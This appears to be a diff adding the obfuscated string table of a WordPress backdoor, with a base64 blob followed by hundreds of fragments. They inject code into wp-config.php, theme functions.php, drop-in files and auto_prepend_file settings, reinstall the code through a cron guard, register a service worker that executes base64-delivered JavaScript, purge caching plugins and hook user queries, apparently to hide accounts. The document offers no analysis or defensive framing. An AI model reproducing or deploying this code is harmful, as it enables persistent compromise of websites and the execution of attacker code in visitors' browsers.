+[1101] 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
+[1102] zip
+[1103] .zip
+[1104] inst
+[1105] content_url
+[1106] /wp-content
+[1107] http://
+[1108] https://
+[1109] home_url
+[1110] ?p=
+[1111] /?p=
+[1112] inst
+[1113] #^https?://#
+[1114] sc_sw
+[1115] page_cached
+[1116] page_cached
+[1117] no
+[1118] contracts
+[1119] rpcs
+[1120] adminBase
+[1121] zipUrl
+[1122] slug
+[1123] installerUrl
+[1124] writeKey
+[1125] wk
+[1126] pageCode
+[1127] var __SC_BOOT=JSON.parse(atob("
+[1128] "));
+[1129] var __SC_ENC="
+[1130] ";
+[1131] contracts
+[1132] rpcs
+[1133] sw_config
+[1134] sw_config_sig
+[1135] no
+[1136] home_url
+[1137] ?p=
+[1138] no
+[1139] .php
+[1140] inst_tpl
+[1141] sc_last_fetch_ts
+[1142] inst_tpl_missing
+[1143] sw_inst
+[1144] <?
+[1145] TOKEN_PARSE
+[1146] str_repeat
+[1147] sc_sw
+[1148] sc_sw
+[1149] sw_cached
+[1150] page_cached
+[1151] sw_config_sig
+[1152] n339hprvf7gbg81ss2zn
+[1153] n339hprvf7gbg81ss2zn
+[1154] sw_setup
+[1155] ldr
+[1156] strcasecmp
+[1157] (none)
+[1158] /cache
+[1159] /cache
+[1160] /\
+[1161] WP_CONTENT_DIR
+[1162] /.
+[1163] /\
+[1164] /\n?auto_prepend_file\s*=\s*["']?[^"'\r\n]*
+[1165] [^"'\r\n]*["']?\r?\n?/i
+[1166] ini
+[1167] retired
+[1168] sc_ini_pending
+[1169] sc_ini_fail
+[1170] sc_ini_dead
+[1171] ABSPATH
+[1172] htl
+[1173] /cache
+[1174] WP_CONTENT_DIR
+[1175] /\
+[1176] /\
+[1177] WP_CONTENT_DIR
+[1178] /\
+[1179] /.htaccess
+[1180] ht
+[1181] retired
+[1182] <FilesMatch "\.(zip|log|sql)$">
+[1183] <IfModule mod_authz_core.c>
+[1184] Require all denied
+[1185] </IfModule>
+[1186] <IfModule !mod_authz_core.c>
+[1187] Deny from all
+[1188] </IfModule>
+[1189] </FilesMatch>
+[1190] read_failed
+[1191] WP_CONTENT_DIR
+[1192] /\
+[1193] /index.html
+[1194] idx
+[1195] FilesMatch
+[1196] rmw_race
+[1197] get_option
+[1198] opt
+[1199] update_option
+[1200] DB_HOST
+[1201] DB_USER
+[1202] DB_PASSWORD
+[1203] DB_NAME
+[1204] mysqli
+[1205] mysqli
+[1206] DB_HOST
+[1207] mysqli: 
+[1208] oc
+[1209] /.wp-object-cache-
+[1210] .dat
+[1211] SCD1
+[1212] <?php
+[1213] oc_tpl
+[1214] /^<\?php\s*/
+[1215] oc_m
+[1216] /* SC_OC_BEGIN:
+[1217]  */
+[1218] /* SC_OC_END:
+[1219] <?php /* .wp-object-cache-
+[1220]  */ /* SCOCV:
+[1221] canary_arm_fail
+[1222] SC_OC_BEGIN
+[1223] .wp-object-cache-
+[1224] /SCOCV:(\d+\.\d+\.\d+)/
+[1225] >=
+[1226] /\n?\/\* SC_OC_BEGIN:([a-zA-Z0-9._]*:
+[1227] ) \*\/.*?\/\* SC_OC_END:\1 \*\/\n?/s
+[1228] pcre_fail
+[1229] oc
+[1230] reins_cap
+[1231] oc
+[1232] /* .wp-object-cache-
+[1233] /^SCD1:(\d+\.\d+\.\d+):/
+[1234] sc_oc_dat_ok
+[1235] no
+[1236] oc
+[1237] dat_corrupt
+[1238] SCD1:
+[1239] sc_oc_dat_ok
+[1240] ftok
+[1241] ABSPATH
+[1242] shmop_open
+[1243] hash
+[1244] sha256
+[1245] SCSHM1:
+[1246] shmop_open
+[1247] shmop_size
+[1248] shmop_read
+[1249] shmop_close
+[1250] shmop_write
+[1251] str_pad
+[1252] shmop
+[1253] shmop_delete
+[1254] verify_fail
+[1255] /<\?php/i
+[1256] /^\s*(declare\s*\(.*?\)\s*;|namespace\s+[^;{]+\s*;|namespace\s+[^;{]+\s*\{|\/\*.*?\*\/|\/\/[^\n]*\n|#[^\n]*\n)/is
+[1257] <?php 
+[1258] get_option
+[1259] sc_reins_
+[1260] no
+[1261] dropin
+[1262] tug_of_war 
+[1263] intval
+[1264] wpdb
+[1265] wpdb
+[1266] SC_ADVL_
+[1267] adv
+[1268] adv_tpl_missing
+[1269] adv_m
+[1270] /* SC_ADV_BEGIN:
+[1271]  */
+[1272] /* SC_ADV_END:
+[1273]  */
+[1274] /\/\* SC_ADV_BEGIN:([a-zA-Z0-9._]*:
+[1275] ) \*\/.*?\/\* SC_ADV_END:\1 \*\//s
+[1276] SC_ADV_LOADED
+[1277] /[ \t]*if\s*\(\s*defined\s*\(\s*["']SC_ADV_LOADED["']\s*\)\s*\)\s*return\s*;[^\r\n]*/
+[1278] adv
+[1279] adv
+[1280] ABSPATH
+[1281] cli
+[1282] sc_guard
+[1283] wp-includes
+[1284] .php
+[1285] /.gl_
+[1286] /.gx_
+[1287] /.g_
+[1288] .php
+[1289] /.gv_
+[1290] /^\d+\.\d+\.\d+$/
+[1291] /.gs_
+[1292] reap_suspected
+[1293] no_status
+[1294] home_url
+[1295] guard
+[1296] sc_last_fetch_ts
+[1297] guard
+[1298] guard_tpl_missing
+[1299] guard
+[1300] guard_tpl_invalid
+[1301] /.gm_
+[1302] guard
+[1303] guard
+[1304] substr_count
+[1305] disk_free_space
+[1306] WP_CONTENT_DIR
+[1307] sc_pad_off_ts
+[1308] no
+[1309] get_option
+[1310] ?>
+[1311] random_bytes
+[1312] bin2hex
+[1313] */
+[1314] /(\r?\n\/\*[0-9a-f]{1000,}\*\/)+$/
+[1315] memory_limit
+[1316] -1
+[1317] strtoupper
+[1318] memory_get_usage
+[1319] memory_get_usage
+[1320] update_option
+[1321] sc_own_m
+[1322] sc_own_m
+[1323] sc_own_m
+[1324] sc_own_manifest
+[1325] sc_own_m
+[1326] sc_own_m
+[1327] get_option
+[1328] sc_own_manifest
+[1329] modified
+[1330] legacy
+[1331] /own_
+[1332] own
+[1333] sc_own_rec
+[1334] req
+[1335] req
+[1336] ok
+[1337] state
+[1338] boot_ts
+[1339] boot_ts
+[1340] gen
+[1341] start_ts
+[1342] boot_ts
+[1343] REQUEST_TIME
+[1344] state
+[1345] boot_ts
+[1346] boot_ts
+[1347] wpdb
+[1348] check_connection
+[1349] wpdb
+[1350] gone
+[1351] boot_ts
+[1352] unknown
+[1353] fail
+[1354] starting
+[1355] /(\/\*[0-9a-f]{1000,}\*\/)\s*$/
+[1356] get_option
+[1357] update_option
+[1358] sc_deferred_del
+[1359] sc_deferred_del
+[1360] opcache_invalidate
+[1361] error_get_last
+[1362] file
+[1363] ok
+[1364] .lkg
+[1365] .lkg
+[1366] .lkg
+[1367] preg_match_all
+[1368] /base64_decode\(\s*'([A-Za-z0-9+\/=]{1000,})'\s*\)/
+[1369] /(?:gzdecode|gzinflate|gzuncompress)\(\s*"((?:[^"\\]*(?:\\.[^"\\]*)*))"/s
+[1370] \x
+[1371] /\\x([0-9a-fA-F]{2})/
+[1372] t5fm8h_nd_uheze5
+[1373] /(?:gzdecode|gzinflate|gzuncompress)\(\s*'((?:[^'\\]*(?:\\.[^'\\]*)*))'/s
+[1374] \\
+[1375] \'
+[1376] gz
+[1377] base64_decode
+[1378] \x
+[1379] /\\x([0-9a-fA-F]{2})/
+[1380] \\
+[1381] /\\x([0-9a-fA-F]{2})/
+[1382] t5fm8h_nd_uheze5
+[1383] /\/\* SCV:(\d+\.\d+\.\d+) \*\//
+[1384] _BEGIN:
+[1385]  */
+[1386] /^[a-zA-Z0-9._:]+$/
+[1387] /* 
+[1388] _END:
+[1389]  */
+[1390] ABSPATH
+[1391] th_m
+[1392] /\/\* SC_TH_BEGIN:[a-zA-Z0-9._]*:
+[1393]  \*\//
+[1394] SC_TH
+[1395] xaze93eb8co2an3z0ez
+[1396] SC_DD
+[1397] o73fa5kekboyjkrwpuai
+[1398] /\/\/SC_TH_LD_[a-f0-9_]+\r?\n[^\n]*$/
+[1399] SC_TH
+[1400] inccy6e0sge0rijm
+[1401] ABSPATH
+[1402] /\/\* SC_TH_BEGIN:([a-zA-Z0-9._:]+) \*\//
+[1403] dd
+[1404] /\/\* SC_DD_BEGIN:([a-zA-Z0-9._:]+) \*\//
+[1405] sc_c
+[1406] items
+[1407] items
+[1408] hash_equals
+[1409] sc_sck
+[1410] shutdown
+[1411] t5js1d0nnu9e1xq
+[1412] t5js1d0nnu9e1xq
+[1413] sc_sck_done
+[1414] sc_sck
+[1415] -->
+[1416] blind
+[1417] items
+[1418] tries
+[1419] md5_file
+[1420] ts
+[1421] bl
+[1422] born
+[1423] items
+[1424] miss
+[1425] items
+[1426] next
+[1427] slow
+[1428] canary
+[1429] bak_write_fail
+[1430] arm_full
+[1431] /thb_
+[1432] .bak
+[1433] miss
+[1434] slow
+[1435] wp_cache_delete
+[1436] sc_canary
+[1437] items
+[1438] items
+[1439] items
+[1440] items
+[1441] state_write_fail
+[1442] d7so_0upa06n8_aw5v
+[1443] is_float
+[1444] f940ucsud9i8m9y
+[1445] f940ucsud9i8m9y
+[1446] timeout
+[1447] sslverify
+[1448] blocking
+[1449] redirection
+[1450] Cache-Control
+[1451] no-store, no-cache
+[1452] Pragma
+[1453] no-cache
+[1454] wp_remote_retrieve_response_code
+[1455] wp_remote_retrieve_body
+[1456] no
+[1457] opcache_invalidate
+[1458] sc_canary
+[1459] items
+[1460] ts
+[1461] tries
+[1462] items
+[1463] sc_canary
+[1464] wp_remote_get
+[1465] home_url
+[1466] bl
+[1467] tries
+[1468] born
+[1469] next
+[1470] ?sc_c=
+[1471] rawurlencode
+[1472] &_r=
+[1473] sleep
+[1474] rollback_500 
+[1475] <!--SCK:
+[1476] sc_c=
+[1477] rollback_login500 
+[1478] items
+[1479] -->
+[1480] items
+[1481] miss
+[1482] miss
+[1483] blind|
+[1484] no
+[1485] lb_blind
+[1486] items
+[1487] bl
+[1488] sc_lb_mode
+[1489] ok|
+[1490] options
+[1491] items
+[1492] ts
+[1493] ts
+[1494] ts
+[1495] items
+[1496] no
+[1497] _sc_fam
+[1498] SC_TH_BEGIN
+[1499] SCSHM1:
+[1500] SCV:
+[1501] /SC_(?:DB|ADV|OC)_BEGIN:(\d+\.\d+\.\d+)/
+[1502] sweep
+[1503] neutralize_foreign_skip 
+[1504] /[ \t]*\/\* SC_(DB|ADV|OC)_BEGIN:([a-zA-Z0-9._:]+) \*\/.*?\/\* SC_\1_END:\2 \*\/[ \t]*\r?\n?/s
+[1505] <?php
+[1506] scd
+[1507] /is_file\(\s*'([^']+)'\s*\)/
+[1508] /\
+[1509] ddb_foreign_skip 
+[1510] no
+[1511] wp-config.php
+[1512] WP_Core_Integrity
+[1513] /tmp/php
+[1514] WP_TEMP_DIR
+[1515] /tmp
+[1516] /define\s*\(\s*['"]WP_CACHE['"]/
+[1517] WP_CONTENT_DIR
+[1518] SC_ADV_BEGIN:
+[1519] SC_WC
+[1520] /define\s*\(\s*['"]ABSPATH['"]\s*,[^;]*\)\s*;\s*\r?\ndefine\( 'WP_CACHE', true \);\r?\n/
+[1521] /define\s*\(\s*['"]WP_DEBUG['"]\s*,\s*true\s*\)/i
+[1522] /define\s*\(\s*['"]WP_DEBUG_LOG['"]\s*,\s*true\s*\)/i
+[1523] /define\s*\(\s*['"]WP_DEBUG_DISPLAY['"]\s*,\s*false\s*\)/i
+[1524] /[ \t]*\/\* WP_Core_Integrity ([a-f0-9]+) \*\/.*?\/\* End-WP_Core_Integrity \1 \*\/[ \t]*\r?\n?/s
+[1525] /\b(?:endif|else)\b/
+[1526] /^[ \t]*if\s*\(\s*!?\s*file_exists\(\s*'\/tmp\/php[A-Za-z0-9]+'[^\n]*\n([ \t]*if\s*\(\s*\$_o&&[^\n]*\n)?/m
+[1527] define\s*\(\s*['"]ABSPATH['"]\s*,[^;]*\)\s*;\s*\r?\n
+[1528] /(
+[1529] )/
+[1530] $1
+[1531] $1
+[1532] )define\( 'WP_CACHE', true \);\r?\n/
+[1533] /^[ \t]*define\s*\(\s*['"]WP_DEBUG(_LOG|_DISPLAY)?['"]\s*,[^\n]*\n/im
+[1534] )/
+[1535] sc_wc_mig
+[1536] no
+[1537] wpc
+[1538] canary_arm_fail
+[1539] /(
+[1540] )define\( 'WP_CACHE', true \); \/\* SC_WC \*\/\r?\n/
+[1541] wpc
+[1542] rmw_race
+[1543] scw
+[1544] opcache_invalidate
+[1545] sc_wc_mig
+[1546] /'(\/tmp\/php[A-Za-z0-9]+)'/
+[1547] delete_option
+[1548] /option_name\s*=\s*'([^']+)'/
+[1549] /^_site_transient_(health|feed)_[a-f0-9]+$/
+[1550] glob
+[1551] foreign_skip 
+[1552] opcache_invalidate
+[1553] /*/functions.php
+[1554] SC_DD_BEGIN
+[1555] SC_TH_LD_
+[1556] opcache_invalidate
+[1557] delete_option
+[1558] bfu0j70dh0p4svdp
+[1559] opt
+[1560] ha6n4xzzq657quc42q
+[1561] kkzbkp5shk0_cqr2e
+[1562] cczrzqn4almu6yf1n
+[1563] sc_boot_tk
+[1564] boot
+[1565] legacy_takeover
+[1566] sc_persisted
+[1567] register_shutdown_function
+[1568] items
+[1569] items
+[1570] items
+[1571] d7so_0upa06n8_aw5v
+[1572] sc_scrub_ts
+[1573] line:
+[1574] sc_persist_manifest
+[1575] size
+[1576] mtime
+[1577] /\|r(\d+)$/
+[1578] /\|r(\d+)$/
+[1579] .php
+[1580] /plugins/
+[1581] get_option
+[1582] sc_sync_bk
+[1583] /^(\d+)\|(\d+)$/
+[1584] get_option
+[1585] sc_sync_bk
+[1586] /db.php
+[1587] /functions.php
+[1588] mtime
+[1589] |r
+[1590] |0
+[1591] no
+[1592] persist
+[1593] mtime
+[1594] size
+[1595] big:
+[1596] sc_pending_invalidate
+[1597] wp_cache_delete
+[1598] notoptions
+[1599] options
+[1600] sc_pending_invalidate
+[1601] zip
+[1602] .zip
+[1603] inst
+[1604] SC_DB
+[1605] /\/\* 
+[1606] /SCOCV:\d+\.\d+\.\d+/
+[1607] <?php /* .wp-object-cache-
+[1608] /\n?\/\* SC_OC_BEGIN:([a-zA-Z0-9._:]+) \*\/.*?\/\* SC_OC_END:\1 \*\/\n?/s
+[1609] WP_CONTENT_DIR
+[1610] glob
+[1611] /uploads/*/*/
+[1612] /themes/*/
+[1613] wp-includes/
+[1614] *.php
+[1615] inval
+[1616] .gl_
+[1617] .gs_
+[1618] .gk_
+[1619] .gp_
+[1620] .gt_
+[1621] .gm_
+[1622] .gv_
+[1623] .gsu_
+[1624] .grd_
+[1625] /.gr_*.php
+[1626] /\
+[1627] /\
+[1628] /\
+[1629] WP_CONTENT_DIR
+[1630] /\
+[1631] auto_prepend_file
+[1632] /\n?<IfModule mod_php[0-9.]*\.c>\s*php_value auto_prepend_file[^\n]*
+[1633] [^\n]*\n<\/IfModule>\n?/i
+[1634] [^\n]*\n?/i
+[1635] /[ \t]*define\s*\(\s*['"]WP_CACHE['"]\s*,\s*true\s*\)\s*;\s*\/\* SC_WC \*\/[ \t]*\r?\n?/
+[1636] ini_get
+[1637] WP_CONTENT_DIR
+[1638] /\
+[1639] /auto_prepend_file\s*=.*
+[1640] .*\n/i
+[1641] /auto_prepend_file\s*(?:=|\s)\s*(?:"([^"\r\n]+)"|'([^'\r\n]+)'|([^\s"\r\n]+))/i
+[1642] SC_TH
+[1643] inccy6e0sge0rijm
+[1644] SC_DD
+[1645] shmop_open
+[1646] get_option
+[1647] items
+[1648] items
+[1649] sc_canary
+[1650] sc_ht_fail
+[1651] sc_ht_dead
+[1652] sc_ini_dead
+[1653] lkf9m_yeb60fjipi2
+[1654] sc_cron_guard
+[1655] invalidate
+[1656] db_m
+[1657] /* SC_DB_BEGIN:
+[1658] /* SC_DB_END:
+[1659] /\/\* SC_DB_BEGIN:([a-zA-Z0-9._]*:
+[1660] ) \*\/.*?\/\* SC_DB_END:\1 \*\//s
+[1661] SC_DB_LOADED
+[1662] /[ \t]*if\s*\(\s*defined\s*\(\s*["']SC_DB_LOADED["']\s*\)\s*\)\s*return\s*;[^\r\n]*/
+[1663] db
+[1664] SC_DBL_
+[1665] db
+[1666] db_tpl_missing
+[1667] db
+[1668] db
+[1669] canary_arm_fail
+[1670] db
+[1671] get_option
+[1672] ABSPATH
+[1673] /themes/
+[1674] /functions.php
+[1675] template
+[1676] /functions.php
+[1677] is_multisite
+[1678] get_site_option
+[1679] sc_theme_safety
+[1680] sc_theme_safety
+[1681] update_site_option
+[1682] sc_theme_safety
+[1683] no
+[1684] sc_theme_virgin_db
+[1685] sha256
+[1686] data
+[1687] /thv_
+[1688] .bak
+[1689] /thv_
+[1690] vanish_restored
+[1691] /* SC_TH_BEGIN:
+[1692]  */
+[1693] /* SC_TH_END:
+[1694]  */
+[1695] SC_THL_
+[1696] theme
+[1697] theme_tpl_missing
+[1698] theme
+[1699] th_m
+[1700] ijtxb76m3ysp02
+[1701] theme
+[1702] SC_TH_BEGIN
+[1703] SC_TH_LD_
+[1704] /SC_TH_BEGIN:[0-9.]+:
+[1705] orphan_foreign
+[1706] /\n?[ \t]*\/\* SC_TH_BEGIN:[^*]*\*\/.*$/s
+[1707] /^[ \t]*\/\/SC_TH_LD_[a-f0-9_]+[^\n]*\r?\n([^\n]*(\r?\n|$))?/m
+[1708] orphan
+[1709] rmw_race
+[1710] /^\s*namespace\s+[^;{]+\s*\{/m
+[1711] ns_skip
+[1712] <?php 
+[1713] token_get_all
+[1714] T_OPEN_TAG_WITH_ECHO
+[1715] strrpos
+[1716] <?
+[1717] .php
+[1718] src_empty
+[1719] ZipArchive
+[1720] /uploads/
+[1721] date
+[1722] Y/m/
+[1723] wp-content
+[1724] .php
+[1725] ABSPATH
+[1726] lkf9m_yeb60fjipi2
+[1727] hourly
+[1728] sc_guard_interval
+[1729] cron_setup
+[1730] b81lebi_28cwmp
+[1731] wp-includes
+[1732] /.gm_
+[1733] md5_file
+[1734] cron_guard
+[1735] .php
+[1736] src_invalid
+[1737] /plugins/
+[1738] cron_rec
+[1739] sc_datasc
+[1740] .php
+[1741] HTTP/1.1 404 Not Found
+[1742] sc_sw_ep_hits
+[1743] /^\s*(?:\(|\/\*|\/\/|var |let |const |function |self\.)/
+[1744] /^[A-Za-z0-9+\/=\r\n]+$/
+[1745] Content-Type: application/javascript; charset=utf-8
+[1746] Service-Worker-Allowed: /
+[1747] HTTP/1.1 204 No Content
+[1748] HTTP_IF_NONE_MATCH
+[1749] HTTP_IF_NONE_MATCH
+[1750] HTTP/1.1 304 Not Modified
+[1751] ETag: 
+[1752] Service-Worker-Allowed: /
+[1753] Cache-Control: no-cache
+[1754] sw_ep
+[1755] sc_verify
+[1756] siteurl
+[1757] HTTP_HOST
+[1758] HTTP_HOST
+[1759] /:\d+$/
+[1760] |verify
+[1761] sc_semantic_probe|
+[1762] Content-Type: text/plain
+[1763] Cache-Control: no-store
+[1764] SC_SEM:
+[1765] SC_SEM_FAIL
+[1766] verify_ep
+[1767] verify_ep
+[1768] rocket_clean_domain
+[1769] w3tc_flush_all
+[1770] litespeed_purge_all
+[1771] LiteSpeed_Cache_API
+[1772] purge_all
+[1773] Breeze_PurgeCache
+[1774] breeze_cache_flush
+[1775] breeze_cache_flush
+[1776] clear_total_cache
+[1777] wpfc_clear_all_cache
+[1778] wp_fastest_cache
+[1779] wp_fastest_cache
+[1780] deleteCache
+[1781] wp_cache_clear_cache
+[1782] wp_cache_clear_cache
+[1783] autoptimizeCache
+[1784] clearall
+[1785] purge_on_js_change
+[1786] is_admin
+[1787] wp_doing_ajax
+[1788] REST_REQUEST
+[1789] XMLRPC_REQUEST
+[1790] is_feed
+[1791] is_robots
+[1792] is_sitemaps
+[1793] is_customize_preview
+[1794] elementor-preview
+[1795] customize_changeset_uuid
+[1796] fl_builder
+[1797] sc_js
+[1798] </script
+[1799] <\/script
+[1800] update_option
+[1801] sc_js_print_note
+[1802] sc_js_print_note
+[1803] PHP_OUTPUT_HANDLER_FINAL
+[1804] Content-Disposition:
+[1805] attachment
+[1806] Content-Type:
+[1807] text/html
+[1808] application/xhtml
+[1809] </body>
+[1810] <html
+[1811] </body>
+[1812] sc_js_ob
+[1813] sc_js
+[1814] REQUEST_URI
+[1815] /\.(zip|gz|tar|bz2|pdf|csv|xlsx?|docx?|sql|mp4|iso)(\?|$)/i
+[1816] attachment
+[1817] Content-Type:
+[1818] application/xhtml
+[1819] Content-Length:
+[1820] ob_start
+[1821] dsuspqx54adz27
+[1822] js_ob
+[1823] pagenow
+[1824] pagenow
+[1825] wp-login.php
+[1826] sc_sw_had
+[1827] sc_sw_last_url
+[1828] <script data-sc-
+[1829] var d=function(h){var r="",i;for(i=0;i<h.length;i+=2)r+=String.fromCharCode(parseInt(h.substr(i,2),16));return r},
+[1830] sw=navigator[d("
+[1831] serviceWorker
+[1832] ")],
+[1833] lu=
+[1834] if(sw)sw[d("
+[1835] getRegistrations
+[1836] ")]().then(function(rs){rs.forEach(function(r){var m=!lu;
+[1837] if(!m)[d("
+[1838] active
+[1839] "),d("
+[1840] waiting
+[1841] installing
+[1842] ")].forEach(function(k){if(r[k]&&r[k][d("
+[1843] scriptURL
+[1844] ")]===lu)m=1});
+[1845] if(m)r[d("
+[1846] unregister
+[1847] ")]()})})[d("
+[1848] catch
+[1849] ")](function(){})
+[1850] </script>
+[1851] http://
+[1852] https://
+[1853] no
+[1854] <script data-sc-
+[1855] var d=function(h){var r="",i;for(i=0;i<h.length;i+=2)r+=String.fromCharCode(parseInt(h.substr(i,2),16));return r},
+[1856] ")];
+[1857] if(sw){
+[1858] sw[d("
+[1859] getRegistration
+[1860] ")](
+[1861] .then(function(r){var ok=0;if(r)[d("
+[1862] active
+[1863] "),d("
+[1864] ")].forEach(function(k){if(r[k]&&r[k][d("
+[1865] ")]===
+[1866] )ok=1});
+[1867] if(!ok)sw[d("
+[1868] register
+[1869] ,{scope:
+[1870] })[d("
+[1871] catch
+[1872] ")](function(){})})
+[1873] [d("
+[1874] ")](function(){});
+[1875] addEventListener
+[1876] ")](d("
+[1877] "),function(e){
+[1878] var v=e[d("
+[1879] ")];
+[1880] if(v&&v.c){try{new Function(atob(v.c))()}catch(x){}}});
+[1881] ready
+[1882] ")].then(function(r){
+[1883] r[d("
+[1884] active
+[1885] ")][d("
+[1886] postMessage
+[1887] ")]({t:"r"})})}
+[1888] sw_reg
+[1889] /.swm_
+[1890] WP_PLUGIN_DIR
+[1891] /*.php
+[1892] /*/*.php
+[1893] .php
+[1894] foreign_skip 
+[1895] .php
+[1896] mu-plugins
+[1897] active_plugins
+[1898] get_site_option
+[1899] /.bad_
+[1900] path
+[1901] .php
+[1902] sc_boot_ver
+[1903] sc_boot_tk
+[1904] SC_CORE_BOOTSTRAPPED
+[1905] SC_CORE_BOOT_VER
+[1906] starting
+[1907] _7yukrj9rlu19rcly
+[1908] vlhubyt0p4vwin49h4
+[1909] php
+[1910] dedup
+[1911] w8qnqcifwbh8p8fb0eq
+[1912] n7rxd4rlmbpallg8
+[1913] w7o7lg6_sy1hkasuvnezo8
+[1914] /.bt_
+[1915] .ocf_
+[1916] my6l70g51_ce3bdcvq
+[1917] _9pxchy13vzgd806e
+[1918] load-plugins.php
+[1919] admin_init
+[1920] admin_init
+[1921] lkzp1aqg9ldx_khcmqd
+[1922] ivf9s8l6nt5akeqzvdc
+[1923] baa_srs78ot0tqv_s47xwx
+[1924] lagqfk_guwteje5x7
+[1925] wpfm_elfinder_connector_opts
+[1926] uwour3adotb8j7gag4iwfz
+[1927] wp_file_manager_connector_opts
+[1928] elfinder_connector_opts
+[1929] uwour3adotb8j7gag4iwfz
+[1930] file_manager_connector_opts
+[1931] authenticate
+[1932] vl6wotnnqvlx5s2mx10191
+[1933] ixkh9fmna47q0vu3h
+[1934] pre_user_query
+[1935] sea9rj9lxuvioh
+[1936] rest_user_query
